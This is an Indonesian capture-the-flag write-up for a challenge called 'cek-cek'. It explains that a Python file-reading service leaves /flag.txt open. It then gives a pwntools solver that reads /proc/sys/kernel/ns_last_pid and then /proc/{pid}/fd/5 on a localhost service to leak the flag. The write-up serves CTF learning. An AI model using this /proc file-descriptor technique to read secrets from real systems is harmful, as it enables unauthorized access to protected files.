# cek-cek

## Author
hilmo

## Description
Hei, aku baru belajar python. Semoga aku tidak melupakan sesuatu.

## Solution
Python code yang diberikan terdapat sebuah vuln dimana, `os.Open` tidak ditutup menggunakan `os.CLose()` sehingga symlink di file `/proc/{pid}/fd/{fd}` bisa digunakan untuk mengakses flag.txt.

```python
...
flag_file = os.open("/flag.txt", os.O_RDONLY)
flag_data = os.read(flag_file, 1024)
...
```

#### mendapatkan PID
PID bisa dilihat pada file `/proc/sys/kernel/ns_last_pid`

#### mendapatkan FD
Bagian ini kita harus mencari secara manual, karena flag dibuka diawal main function fd seharunysa kurang dari 10. Setelah manual mencari didapatkan fd = 5.
`/proc/{las_pid}/fd/5`

#### solver code
maka dapat dibuat file solver sebagai berikut

```python
from pwn import *

IP = "localhost"
PORT = 1337
p = remote(IP, PORT)

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"file name: ")
p.sendline(b"/proc/sys/kernel/ns_last_pid")
las_pid = p.recvline().decode().strip()

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"file name: ")
p.sendline(f"/proc/{las_pid}/fd/5".encode())

flag = p.recvline()
print(flag)
```
